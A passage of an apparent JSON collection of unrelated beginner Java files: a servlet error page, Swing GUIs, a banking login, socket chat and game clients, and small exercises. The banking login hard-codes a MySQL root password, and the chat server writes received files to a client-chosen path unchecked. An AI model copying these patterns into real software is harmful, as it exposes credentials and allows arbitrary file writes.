req.getAttribute(\"javax.servlet.error.servlet_name\");\n        String requestUri = (String) req.getAttribute(\"javax.servlet.error.request_uri\");\n        String errorMessage = ResponseCode.INTERNAL_SERVER_ERROR.getMessage();\n        String errorCode = ResponseCode.INTERNAL_SERVER_ERROR.name();\n\n        if (statusCode == null)\n            statusCode = 0;\n        Optional<ResponseCode> errorCodes = ResponseCode.getMessageByStatusCode(statusCode);\n        if (errorCodes.isPresent()) {\n            errorMessage = errorCodes.get().getMessage();\n            errorCode = errorCodes.get().name();\n        }\n\n        if (throwable != null && throwable instanceof StoreException) {\n            StoreException storeException = (StoreException) throwable;\n            if (storeException != null) {\n                errorMessage = storeException.getMessage();\n                statusCode = storeException.getStatusCode();\n                errorCode = storeException.getErrorCode();\n                storeException.printStackTrace();\n            }\n        }\n\n        System.out.println(\"======ERROR TRIGGERED========\");\n        System.out.println(\"Servlet Name: \" + servletName);\n        System.out.println(\"Request URI: \" + requestUri);\n        System.out.println(\"Status Code: \" + statusCode);\n        System.out.println(\"Error Code: \" + errorCode);\n        System.out.println(\"Error Message: \" + errorMessage);\n        System.out.println(\"=============================\");\n\n        if (StoreUtil.isLoggedIn(UserRole.CUSTOMER, req.getSession())) {\n            RequestDispatcher rd = req.getRequestDispatcher(\"CustomerHome.html\");\n            rd.include(req, res);\n            StoreUtil.setActiveTab(pw, \"home\");\n            showErrorMessage(pw, errorCode, errorMessage);\n\n        } else if (StoreUtil.isLoggedIn(UserRole.SELLER, req.getSession())) {\n            RequestDispatcher rd = req.getRequestDispatcher(\"SellerHome.html\");\n            rd.include(req, res);\n            StoreUtil.setActiveTab(pw, \"home\");\n            showErrorMessage(pw, errorCode, errorMessage);\n\n        } else {\n            RequestDispatcher rd = req.getRequestDispatcher(\"index.html\");\n            rd.include(req, res);\n            pw.println(\"<script>\"\n                    + \"document.getElementById('topmid').innerHTML='';\"\n                    + \"document.getElementById('happy').innerHTML='';\"\n                    + \"</script>\");\n            showErrorMessage(pw, errorCode, errorMessage);\n        }\n\n    }\n\n    private void showErrorMessage(PrintWriter pw, String errorCode, String errorMessage) {\n        pw.println(\"<div class='container my-5'>\"\n                + \"<div class=\\\"alert alert-success\\\" role=\\\"alert\\\" style='max-width:450px; text-align:center; margin:auto;'>\\r\\n\"\n                + \"  <h4 class=\\\"alert-heading\\\">\"\n                + errorCode\n                + \"</h4>\\r\\n\"\n                + \"  <hr>\\r\\n\"\n                + \"  <p class=\\\"mb-0\\\">\"\n                + errorMessage\n                + \"</p>\\r\\n\"\n                + \"</div>\"\n                + \"</div>\");\n\n    }\n\n}\n",
    "package com.example.tubesp3b;\n\nimport android.content.Context;\nimport android.os.Bundle;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\n\nimport androidx.fragment.app.Fragment;\n\nimport com.bumptech.glide.Glide;\nimport com.bumptech.glide.load.engine.DiskCacheStrategy;\nimport com.example.tubesp3b.databinding.FragmentShopeeBinding;\n\npublic class ShopeeFragment extends Fragment implements View.OnClickListener {\n\n    private FragmentShopeeBinding binding;\n\n    private Context context;\n    private MainActivity activity;\n\n    public ShopeeFragment(MainActivity activity, Context context) {\n        this.activity = activity;\n        this.context = context;\n    }\n\n    public static ShopeeFragment newInstance(MainActivity activity, Context context) {\n        ShopeeFragment fragment = new ShopeeFragment(activity, context);\n        return fragment;\n    }\n\n    @Override\n    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n    }\n\n    @Override\n    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        // Inflate the layout for this fragment\n        binding = FragmentShopeeBinding.inflate(inflater);\n        View view = binding.getRoot();\n\n        Glide.with(this.activity)\n                .load(\"https://www.freepnglogos.com/uploads/shopee-logo-png/shopee-logo-digital-economy-forum-mdcc-1.png\")\n                .diskCacheStrategy(DiskCacheStrategy.ALL)\n                .into(this.binding.ivShopee);\n\n        return view;\n    }\n\n    @Override\n    public void onClick(View v){\n    }\n}",
    "import org.junit.jupiter.api.Test;\nimport static org.junit.jupiter.api.Assertions.*;\n\npublic class ArrayUtilsTest {\n\n    @Test\n    public void testFindLastNull() {\n        // Do not execute fault\n        assertThrows(NullPointerException.class, () -> {ArrayUtils.findLast(null, 3);});\n    }\n\n\n    @Test\n    public void testFindLastEmpty() {\n        // For any input where y appears in the second or later position, there is no error. Also,\n        // if x is empty, there is no error.\n        assertEquals(-1, ArrayUtils.findLast(new int[]{}, 3));\n    }\n\n    @Test\n    public void testFindLastNonExistent() {\n        assertEquals(-1, ArrayUtils.findLast(new int[]{1, 2}, 3));\n    }\n\n    @Test\n    public void testFindLastExistsFirstElement() {\n        assertEquals(0, ArrayUtils.findLast(new int[]{2, 3, 5}, 2));\n    }\n\n    @Test\n    public void testOddOrPosNull() {\n        // Do not execute fault\n        assertThrows(NullPointerException.class, () -> {ArrayUtils.oddOrPos(null);});\n    }\n\n\n    @Test\n    public void testOddOrPosAllPositives() {\n        // Any nonempty x with only non-negative elements works, because the first part of the\n        // compound if-test is not necessary unless the value is negative.\n        assertEquals(3, ArrayUtils.oddOrPos(new int[]{1, 2, 3}));\n    }\n\n    @Test\n    public void testOddOrPositiveBothPositivesAndNegatives() {\n        assertEquals(3, ArrayUtils.oddOrPos(new int[]{-3, -2, 0, 1, 4}));\n    }\n\n    @Test\n    public void testAccountOf() {\n        int[] testList = {-1, 1, 1,2};\n        assertEquals(2, ArrayUtils.countOf(testList, 1));\n    }\n\n\n}",
    "/*\n * Copyright (C) 2024 Kayque de Freitas <kayquefreitas08@gmail.com>\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\npackage EX3;\n\n/**\n * @author Gustavo Rezende <gustavorezendegabriel@hotmail.com>\n * @author Kayque de Freitas <kayquefreitas08@gmail.com>\n * @data 01/04/2024\n * @brief Class StocKeeper\n */\n\n// Classe abstrata\npublic abstract class StocKeeper {\n    // Atributo\n    private String name;\n\n    // M\u00e9todo Get\n    public String getName() {\n        return name;\n    }\n\n    // M\u00e9todo Set\n    public void setName(String name) {\n        this.name = name;\n    }\n    \n    // M\u00e9todo\n    public void StockKepper(String name){\n        \n    }\n    \n    // M\u00e9todo\n    public void manageMovie() {\n        \n    }\n    \n    // M\u00e9todo\n    public void manageAlbum() {\n        \n    }\n\n}\n",
    "package bankingapplication;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.util.Scanner;\n\nclass Login {\n    private static final String DB_URL = \"jdbc:mysql://localhost:3306/bank_login\";\n    private static final String DB_USER = \"root\";\n    private static final String DB_PASSWORD = \"Clf@56.9fce\";\n\n    public void loginInfo() {\n        Scanner sc = new Scanner(System.in);\n        while (true) {\n            System.out.println(\"===== Login Page =====\");\n            System.out.print(\"Enter your username: \");\n            String username = sc.nextLine();\n            System.out.print(\"Enter your user ID: \");\n            String userID = sc.nextLine();\n            System.out.println(\"Enter your Password:\");\n            String pass = sc.nextLine();\n            try {\n                // Show \"Transacting process\" for 3 seconds\n                System.out\n                        .println(\"Logging in.............................................please wait................\");\n                Thread.sleep(3000);\n            } catch (InterruptedException e) {\n                // Handle the exception if needed\n                e.printStackTrace();\n            }\n            try (Connection connection = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD)) {\n                if (isValidLogin(connection, userID, username, pass)) {\n                    // Successful login\n                    System.out.println(\"Login successful!\\n\");\n                    Account a1 = new Account(username, userID);\n                    a1.showMenue();\n                } else {\n                    // Failed login\n                    System.out.println(\"Login failed. Please enter correct username or password or User Id. Exiting...\");\n                }\n\n            } catch (SQLException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static boolean isValidLogin(Connection connection, String userId, String username, String pass) {\n        String query = \"SELECT * FROM Login_credintals WHERE User_Id = ? AND User_Name = ? AND Password = ?\";\n        try (PreparedStatement preparedStatement = connection.prepareStatement(query)) {\n            preparedStatement.setString(1, userId);\n            preparedStatement.setString(2, username);\n            preparedStatement.setString(3, pass);\n\n            try (ResultSet resultSet = preparedStatement.executeQuery()) {\n                return resultSet.next(); // Check if there is any result\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage projects.java.thread;\n\n/**\n *\n * @author zhuniox\n */\npublic class ThreadIndex extends javax.swing.JFrame {\n\n    /**\n     * Creates new form ThreadMain\n     */\n    public ThreadIndex() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 810, Short.MAX_VALUE)\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 610, Short.MAX_VALUE)\n        );\n\n        pack();\n    }// </editor-fold>//GEN-END:initComponents\n\n    /**\n     * @param args the command line arguments\n     */\n    public static void main(String args[]) {\n        /* Set the Nimbus look and feel */\n        //<editor-fold defaultstate=\"collapsed\" desc=\" Look and feel setting code (optional) \">\n        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.\n         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html \n         */\n        try {\n            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {\n                if (\"Nimbus\".equals(info.getName())) {\n                    javax.swing.UIManager.setLookAndFeel(info.getClassName());\n                    break;\n                }\n            }\n        } catch (ClassNotFoundException ex) {\n            java.util.logging.Logger.getLogger(ThreadIndex.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (InstantiationException ex) {\n            java.util.logging.Logger.getLogger(ThreadIndex.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (IllegalAccessException ex) {\n            java.util.logging.Logger.getLogger(ThreadIndex.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (javax.swing.UnsupportedLookAndFeelException ex) {\n            java.util.logging.Logger.getLogger(ThreadIndex.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        }\n        //</editor-fold>\n        //</editor-fold>\n\n        /* Create and display the form */\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new ThreadIndex().setVisible(true);\n            }\n        });\n    }\n\n    // Variables declaration - do not modify//GEN-BEGIN:variables\n    // End of variables declaration//GEN-END:variables\n}\n",
    "package Client;\n\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.Date;\n\npublic class Client implements Runnable {\n    \n    Socket socket;\n    String user;\n    DataInputStream dis;\n    DataOutputStream dos;\n    ObjectOutputStream objectOut;\n    ObjectInputStream objectIn;\n    \n    Pong pongGame;\n\n\n\n    public Client(int port, String u, Pong game, String ipString ) throws Exception{\n        // getting localhost ip \n        InetAddress ip = InetAddress.getByName(ipString); \n      \n        // establish the connection with server port 5056       \n        socket = new Socket(ip, port);\n\n        this.user = u;\n\n        // make sure we have a reference to the game that will be played\n        this.pongGame = game;\n\n    }\n\n    @Override\n    public void run() {\n        System.out.println(\"client running\");\n        // obtaining input and out streams \n\n        try {\n            dis = new DataInputStream(socket.getInputStream());\n            dos = new DataOutputStream(socket.getOutputStream()); \n            objectIn = new ObjectInputStream(socket.getInputStream());\n            objectOut = new ObjectOutputStream(socket.getOutputStream());\n\n            // the following performs the exchange of \n            // information between client and client handler \n            String received = dis.readUTF(); \n            System.out.println(received); \n\n            received = dis.readUTF(); \n            System.out.println(received); \n\n            if(received.equals(\"please identify yourself\")) {\n                dos.writeUTF(user);\n            }\n            \n            // read the object from the server\n                //objectIn.readObject();\n            // now make this the object be the player...\n            // and start the game if you can\n            // this loop will now listen for updates on other players\n            while (true) {\n                \n                // reads from server:\n                //updateObj ob = (updateObj) objectIn.readObject();\n                // need a user:paddle object to check if we have it\n\n            }\n    \n        } catch (IOException e) {\n            System.out.println(\"error reading, this usually means the connection closed.\");\n            // how do I get the connection button back to working from here??\n            e.printStackTrace();\n        } \n        // catch (ClassNotFoundException e) {\n        //     // TODO Auto-generated catch block\n        //     e.printStackTrace();\n        // } \n\n    }\n\n    public void sendUpdates(){\n        \n    }\n}",
    "import java.util.ArrayList;\nimport java.util.Collections;\n\npublic class JavaVectores {\n    public static void main(String[] args) {\n        // 1. Declarar una lista vac\u00eda\n        ArrayList<String> listaVacia = new ArrayList<>();\n\n        // 2. Declarar una lista con m\u00e1s de 5 elementos\n        ArrayList<String> listaConMasDe5 = new ArrayList<>();\n        listaConMasDe5.add(\"Elemento1\");\n        listaConMasDe5.add(\"Elemento2\");\n        listaConMasDe5.add(\"Elemento3\");\n        listaConMasDe5.add(\"Elemento4\");\n        listaConMasDe5.add(\"Elemento5\");\n        listaConMasDe5.add(\"Elemento6\");\n\n        // 3. Encuentre la longitud de las dos listas creadas anteriormente\n        System.out.println(\"Longitud de listaVacia: \" + listaVacia.size());\n        System.out.println(\"Longitud de listaConMasDe5: \" + listaConMasDe5.size());\n\n        // 4. Obtener el primer elemento, el elemento central y el \u00faltimo elemento de la lista\n        System.out.println(\"Primer elemento de listaConMasDe5: \" + listaConMasDe5.get(0));\n        System.out.println(\"Elemento central de listaConMasDe5: \" + listaConMasDe5.get(listaConMasDe5.size() / 2));\n        System.out.println(\"\u00daltimo elemento de listaConMasDe5: \" + listaConMasDe5.get(listaConMasDe5.size() - 1));\n\n        // 5. Crear una lista llamada Datos_personales que contenga (nombre, edad, altura, estado civil, direcci\u00f3n), y agrega datos utilizando la funcion append()\n        ArrayList<String> datosPersonales = new ArrayList<>();\n        datosPersonales.add(\"Juan\"); // Nombre\n        datosPersonales.add(\"30\"); // Edad\n        datosPersonales.add(\"1.75\"); // Altura\n        datosPersonales.add(\"Soltero\"); // Estado civil\n        datosPersonales.add(\"Calle Falsa 123\"); // Direcci\u00f3n\n\n        // 6. Crea una lista llamada it_companies y as\u00edgnele los valores iniciales Facebook, Google, Microsoft, Apple, IBM, Oracle y Amazon\n        ArrayList<String> itCompanies = new ArrayList<>();\n        itCompanies.add(\"Facebook\");\n        itCompanies.add(\"Google\");\n        itCompanies.add(\"Microsoft\");\n        itCompanies.add(\"Apple\");\n        itCompanies.add(\"IBM\");\n        itCompanies.add(\"Oracle\");\n        itCompanies.add(\"Amazon\");\n\n        // 7. A\u00f1adir una empresa a la lista it_companies utilizando la funcion insert()\n        itCompanies.add(1, \"Twitter\");\n\n        // 8. Comprobar si una determinada empresa existe en la lista it_companies\n        String empresaBuscada = \"Microsoft\";\n        if (itCompanies.contains(empresaBuscada)) {\n            System.out.println(empresaBuscada + \" existe en la lista.\");\n        } else {\n            System.out.println(empresaBuscada + \" no existe en la lista.\");\n        }\n\n        // 9. Ordena la lista con el m\u00e9todo sort()\n        Collections.sort(itCompanies);\n\n        // 10. Invierte la lista en orden descendente utilizando el m\u00e9todo reverse()\n        Collections.reverse(itCompanies);\n\n        // 11. Elimine la primera empresa inform\u00e1tica de la lista utilizando el m\u00e9todo pop y delete\n        String primeraEmpresa = itCompanies.remove(0);\n        System.out.println(\"Se elimin\u00f3 la primera empresa: \" + primeraEmpresa);\n\n        // 12. Eliminar todas las empresas de la lista it_companies\n        itCompanies.clear();\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\n/**\n *\n * @author bodya\n */\npublic class PhonebookGUI extends javax.swing.JFrame {\n        phonebook d =new phonebook();\n    /**\n     * Creates new form PhonebookGUI\n     */\n    public PhonebookGUI() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jLabel1 = new javax.swing.JLabel();\n        jPanel3 = new javax.swing.JPanel();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        jTable1 = new javax.swing.JTable();\n        jPanel4 = new javax.swing.JPanel();\n        jLabel6 = new javax.swing.JLabel();\n        jLabel7 = new javax.swing.JLabel();\n        jLabel8 = new javax.swing.JLabel();\n        jLabel9 = new javax.swing.JLabel();\n        jTextField5 = new javax.swing.JTextField();\n        jTextField6 = new javax.swing.JTextField();\n        jTextField7 = new javax.swing.JTextField();\n        jTextField8 = new javax.swing.JTextField();\n        jPanel5 = new javax.swing.JPanel();\n        jButton4 = new javax.swing.JButton();\n        jButton5 = new javax.swing.JButton();\n        jButton6 = new javax.swing.JButton();\n        jPanel2 = new javax.swing.JPanel();\n        jButton1 = new javax.swing.JButton();\n        jButton2 = new javax.swing.JButton();\n        jButton3 = new javax.swing.JButton();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jLabel1.setFont(new java.awt.Font(\"Calibri\", 0, 36)); // NOI18N\n        jLabel1.setText(\"Phonebook\");\n\n        jPanel3.setBorder(javax.swing.BorderFactory.createTitledBorder(\"Contact list\"));\n\n        jTable1.setModel(new javax.swing.table.DefaultTableModel(\n            new Object [][] {\n                {null, null, null, null},\n                {null, null, null, null},\n                {null, null, null, null},\n                {null, null, null, null}\n            },\n            new String [] {\n                \"Title 1\", \"Title 2\", \"Title 3\", \"Title 4\"\n            }\n        ));\n        jScrollPane1.setViewportView(jTable1);\n\n        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);\n        jPanel3.setLayout(jPanel3Layout);\n        jPanel3Layout.setHorizontalGroup(\n            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel3Layout.createSequentialGroup()\n                .addContainerGap()\n                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 746, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addContainerGap(22, Short.MAX_VALUE))\n        );\n        jPanel3Layout.setVerticalGroup(\n            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel3Layout.createSequentialGroup()\n                .addContainerGap()\n                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 344, Short.MAX_VALUE)\n                .addGap(27, 27, 27))\n        );\n\n        jPanel4.setBorder(javax.swing.BorderFactory.createTitledBorder(\"Contact\"));\n\n        jLabel6.setFont(new java.awt.Font(\"Andalus\", 1, 24)); // NOI18N\n        jLabel6.setText(\"Phone\");\n\n        jLabel7.setFont(new java.awt.Font(\"Andalus\", 1, 24)); // NOI18N\n        jLabel7.setText(\"Name\");\n\n        jLabel8.setFont(new java.awt.Font(\"Andalus\", 1, 24)); // NOI18N\n        jLabel8.setText(\"Address\");\n\n        jLabel9.setFont(new java.awt.Font(\"Andalus\", 1, 24)); // NOI18N\n        jLabel9.setText(\"Email\");\n\n        jTextField5.setFont(new java.awt.Font(\"Andalus\", 0, 24)); // NOI18N\n        jTextField5.setToolTipText(\"\");\n        jTextField5.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jTextField5ActionPerformed(evt);\n            }\n        });\n\n        jTextField6.setToolTipText(\"\");\n        jTextField6.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jTextField6ActionPerformed(evt);\n            }\n        });\n\n        jTextField7.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jTextField7ActionPerformed(evt);\n            }\n        });\n\n        jTextField8.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jTextField8ActionPerformed(evt);\n            }",
    "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class SimpleCalculator {\n    private JFrame frame;\n    private JPanel panel;\n    private JTextField textField;\n    private JButton[] numberButtons;\n    private JButton[] functionButtons;\n    private JButton addButton, subButton, mulButton, divButton, eqButton, clearButton;\n    private Font font;\n\n    private double num1, num2, result;\n    private char operator;\n\n    public SimpleCalculator() {\n        frame = new JFrame(\"Simple Calculator\");\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setSize(300, 400);\n        frame.setLayout(new BorderLayout());\n\n        panel = new JPanel();\n        panel.setLayout(new GridLayout(5, 4));\n\n        textField = new JTextField();\n        textField.setFont(new Font(\"Arial\", Font.PLAIN, 20));\n        textField.setEditable(false);\n\n        font = new Font(\"Arial\", Font.BOLD, 20);\n\n        numberButtons = new JButton[10];\n        for (int i = 0; i < 10; i++) {\n            numberButtons[i] = new JButton(String.valueOf(i));\n            numberButtons[i].setFont(font);\n            numberButtons[i].addActionListener(new NumberButtonListener());\n        }\n\n        addButton = new JButton(\"+\");\n        subButton = new JButton(\"-\");\n        mulButton = new JButton(\"*\");\n        divButton = new JButton(\"/\");\n        eqButton = new JButton(\"=\");\n        clearButton = new JButton(\"C\");\n\n        functionButtons = new JButton[]{addButton, subButton, mulButton, divButton, eqButton, clearButton};\n\n        for (JButton button : functionButtons) {\n            button.setFont(font);\n            button.addActionListener(new FunctionButtonListener());\n        }\n\n\n        panel.add(numberButtons[7]);\n        panel.add(numberButtons[8]);\n        panel.add(numberButtons[9]);\n        panel.add(clearButton);\n        panel.add(numberButtons[4]);\n        panel.add(numberButtons[5]);\n        panel.add(numberButtons[6]);\n        panel.add(addButton);\n        panel.add(numberButtons[1]);\n        panel.add(numberButtons[2]);\n        panel.add(numberButtons[3]);\n        panel.add(subButton);\n        panel.add(mulButton);\n        panel.add(numberButtons[0]);\n        panel.add(divButton);\n        panel.add(eqButton);\n        panel.add(new JLabel());\n        panel.add(new JLabel());\n        panel.add(new JLabel());\n\n        frame.add(textField, BorderLayout.NORTH);\n        frame.add(panel, BorderLayout.CENTER);\n        frame.setVisible(true);\n    }\n\n    class NumberButtonListener implements ActionListener {\n        public void actionPerformed(ActionEvent e) {\n            for (int i = 0; i < 10; i++) {\n                if (e.getSource() == numberButtons[i]) {\n                    textField.setText(textField.getText() + i);\n                }\n            }\n        }\n    }\n\n    class FunctionButtonListener implements ActionListener {\n        public void actionPerformed(ActionEvent e) {\n            if (e.getSource() == clearButton) {\n                textField.setText(\"\");\n            } else if (e.getSource() == addButton || e.getSource() == subButton || e.getSource() == mulButton || e.getSource() == divButton) {\n                num1 = Double.parseDouble(textField.getText());\n                operator = ((JButton) e.getSource()).getText().charAt(0);\n                textField.setText(\"\");\n            } else if (e.getSource() == eqButton) {\n                num2 = Double.parseDouble(textField.getText());\n                switch (operator) {\n                    case '+':\n                        result = num1 + num2;\n                        break;\n                    case '-':\n                        result = num1 - num2;\n                        break;\n                    case '*':\n                        result = num1 * num2;\n                        break;\n                    case '/':\n                        result = num1 / num2;\n                        break;\n                }\n                textField.setText(String.valueOf(result));\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        new SimpleCalculator();\n    }\n}\n",
    "package FinalProject;\n\nimport java.awt.BorderLayout;\nimport java.awt.EventQueue;\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport javax.swing.JFrame;\nimport javax.swing.JOptionPane;\nimport javax.swing.JPanel;\nimport javax.swing.border.EmptyBorder;\n\nimport SourceFile.FileInfo;\n\nimport javax.swing.JTextField;\nimport javax.swing.JButton;\nimport javax.swing.JComponent;\nimport java.awt.Color;\nimport java.awt.Font;\nimport java.awt.TextArea;\nimport java.awt.event.ActionListener;\nimport java.awt.event.ActionEvent;\nimport javax.swing.JLabel;\nimport java.awt.Toolkit;\nimport javax.swing.ImageIcon;\n\n\npublic class Server extends JFrame    {\n\n\tprivate JPanel contentPane;\n\tprivate JTextField msg_text;\n\tprivate TextArea msg_area;\n\tprivate JLabel lblNewLabel;\n\tprivate JLabel lblPort;\n\n\tstatic ServerSocket serverSocket;\n\tstatic Socket socket,socket1;\n\tstatic DataInputStream dataIn;\n\tstatic DataOutputStream dataOut;\n\tprivate static JComponent fame = null;\n\t\n\tpublic static ArrayList<Socket> listSK;\n\t/**\n\t * Launch the application.\n\t */\n\tpublic static void main(String[] args) {\n\t\tEventQueue.invokeLater(new Runnable() {\n\t\t\tpublic void run() {\n\t\t\t\ttry {\n\t\t\t\t\tserverSocket = new ServerSocket(49);\n\t\t\t\t\tJOptionPane.showMessageDialog(fame, \"Server is created on port 49.\", \"Note\", JOptionPane.WARNING_MESSAGE);\n\t\t\t\t\tServer frame = new Server();\n\t\t\t\t\tframe.setVisible(true);\n\t\t\t\t\tServer.listSK = new ArrayList<>();\n\t\t\t\t\tframe.execute();\n\t\t\t\t\t\n\t\t\t\t} catch (Exception e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t}\n\t\t\t\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t});\n\t}\n\tprivate void execute() throws IOException{\n\t\tWaitingClient waiting = new WaitingClient();\n\t\twaiting.start();\n\t\tWaitingFile wF = new WaitingFile();\n\t\twF.start();\n\t}\n\t\n\tprivate boolean createFile(FileInfo fileInfo) {\n        BufferedOutputStream bos = null;\n         \n        try {\n            if (fileInfo != null) {\n                File fileReceive = new File(fileInfo.getDestinationDirectory() \n                        + fileInfo.getFilename());\n                bos = new BufferedOutputStream(\n                        new FileOutputStream(fileReceive));\n                // write file content\n                bos.write(fileInfo.getDataBytes());\n                bos.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        } finally {\n            closeStream(bos);\n        }\n        return true;\n    }\n\t\n\tpublic static void closeStream(InputStream inputStream) {\n        try {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n  public static void closeStream(OutputStream outputStream) {\n        try {\n            if (outputStream != null) {\n                outputStream.close();\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n\n\t/**\n\t * Create the frame.\n\t */\n\tpublic Server() {\n\t\tsetIconImage(Toolkit.getDefaultToolkit().getImage(Server.class.getResource(\"/Images/icon.png\")));\n\t\tsetTitle(\"Server\");\n\t\tsetDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n\t\tsetBounds(100, 100, 567, 379);\n\t\tcontentPane = new JPanel();\n\t\tcontentPane.setBorder(new EmptyBorder(5, 5, 5, 5));\n\t\tsetContentPane(contentPane);\n\t\tcontentPane.setLayout(null);\n\n\t\tmsg_area = new TextArea();\n\t\tmsg_area.setFont(new Font(\"Times New Roman\", Font.PLAIN, 12));\n\t\tmsg_area.setBounds(10, 47, 531, 222);\n\t\tcontentPane.add(msg_area);\n\n\t\tmsg_text = new JTextField();\n\t\tmsg_text.setFont(new Font(\"Times New Roman\", Font.PLAIN, 12));\n\t\tmsg_text.setBounds(10, 279, 450, 52);\n\t\tcontentPane.add(msg_text);\n\t\tmsg_text.setColumns(10);\n\n\t\tJButton btnNewButton = new JButton(\"Send\");\n\t\tbtnNewButton.addActionListener(new ActionListener() {\n\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\n\t\t\t\tSmsOutServer write = new SmsOutServer();\n\t\t\t\twrite.start();\n\t\t\t\t\n\t\t\t}\n\t\t});\n\t\tbtnNewButton.setFont(new Font(\"Times New Roman\", Font.BOLD, 16));\n\t\tbtnNewButton.setForeground(Color.RED);\n\t\tbtnNewButton.setBounds(462, 293, 89, 21);\n\t\tcontentPane.add(btnNewButton);\n\n\t\tlblPort = new JLabel(\"Port Number\");\n\t\tlblPort.setForeground(Color.YELLOW);\n\t\tlblPort.setFont(new Font(\"Times New Roman\", Font.BOLD, 14));\n\t\tlblPort.setBounds(169, 16, 81, 21);\n\t\tcontentPane.add(lblPort);\n\t\t\n\t\tJLabel lblNewLabel_1 = new JLabel(\"49\");\n\t\tlblNewLabel_1.setForeground(Color.YELLOW);\n\t\tlblNewLabel_1.setFont(new Font(\"Times New Roman\", Font.BOLD, 16));\n\t\tlblNewLabel_1.setBounds(263, 20, 48, 13);\n\t\tcontentPane.add(lblNewLabel_1);\n\t\t\n\t\tlblNewLabel = new JLabel(\"\");\n\t\tlblNewLabel.setIcon(new 